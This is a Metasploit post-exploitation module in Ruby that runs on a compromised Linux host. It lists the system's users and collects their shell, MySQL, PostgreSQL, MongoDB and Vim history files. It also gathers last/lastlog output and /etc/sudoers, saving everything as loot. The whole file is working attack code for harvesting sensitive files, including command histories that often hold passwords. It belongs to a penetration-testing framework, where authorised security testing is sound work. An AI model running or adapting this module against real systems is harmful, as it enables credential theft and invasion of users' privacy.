##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Linux Gather User History',
      'Description'  => %q{
        This module gathers the following user-specific information:
        shell history, MySQL history, PostgreSQL history, MongoDB history,
        Vim history, lastlog, and sudoers.
      },
      'License'      => MSF_LICENSE,
      'Author'       =>
        [
          # based largely on get_bash_history function by Stephen Haywood
          'ohdae <bindshell[at]live.com>'
        ],
      'Platform'     => ['linux'],
      'SessionTypes' => ['shell', 'meterpreter']
    ))
  end

  def run
    distro = get_sysinfo

    print_good('Info:')
    print_good("\t#{distro[:version]}")
    print_good("\t#{distro[:kernel]}")

    user = execute('/usr/bin/whoami')
    users = execute('/bin/cat /etc/passwd | cut -d : -f 1').chomp.split
    users = [user] if user != 'root' || users.blank?

    vprint_status("Retrieving history for #{users.length} users")
    shells = %w{ash bash csh ksh sh tcsh zsh}
    users.each do |u|
      home = get_home_dir(u)
      shells.each do |shell|
        get_shell_history(u, home, shell)
      end
      get_mysql_history(u, home)
      get_psql_history(u, home)
      get_mongodb_history(u, home)
      get_vim_history(u, home)
    end

    last = execute('/usr/bin/last && /usr/bin/lastlog')
    sudoers = cat_file('/etc/sudoers')
    save('Last logs', last) unless last.blank?
    save('Sudoers', sudoers) unless sudoers.blank? || sudoers =~ /Permission denied/
  end

  def save(msg, data, ctype = 'text/plain')
    ltype = 'linux.enum.users'
    loot = store_loot(ltype, ctype, session, data, nil, msg)
    print_good("#{msg} stored in #{loot.to_s}")
  end

  def execute(cmd)
    vprint_status("Execute: #{cmd}")
    output = cmd_exec(cmd)
    output
  end

  def cat_file(filename)
    vprint_status("Download: #{filename}")
    output = read_file(filename)
    output
  end

  def get_home_dir(user)
    home = execute("echo ~#{user}")
    if home.empty?
      if user == 'root'
        home = '/root'
      else
        home = "/home/#{user}"
      end
    end
    home
  end

  def get_shell_history(user, home, shell)
    vprint_status("Extracting #{shell} history for #{user}")
    hist = cat_file("#{home}/.#{shell}_history")
    save("#{shell} history for #{user}", hist) unless hist.blank? || hist =~ /No such file or directory/
  end

  def get_mysql_history(user, home)
    vprint_status("Extracting MySQL history for #{user}")
    sql_hist = cat_file("#{home}/.mysql_history")
    save("MySQL history for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
  end

  def get_psql_history(user, home)
    vprint_status("Extracting PostgreSQL history for #{user}")
    sql_hist = cat_file("#{home}/.psql_history")
    save("PostgreSQL history for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
  end

  def get_mongodb_history(user, home)
    vprint_status("Extracting MongoDB history for #{user}")
    sql_hist = cat_file("#{home}/.dbshell")
    save("MongoDB history for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
  end

  def get_vim_history(user, home)
    vprint_status("Extracting Vim history for #{user}")
    vim_hist = cat_file("#{home}/.viminfo")
    save("Vim history for #{user}", vim_hist) unless vim_hist.blank? || vim_hist =~ /No such file or directory/
  end
end
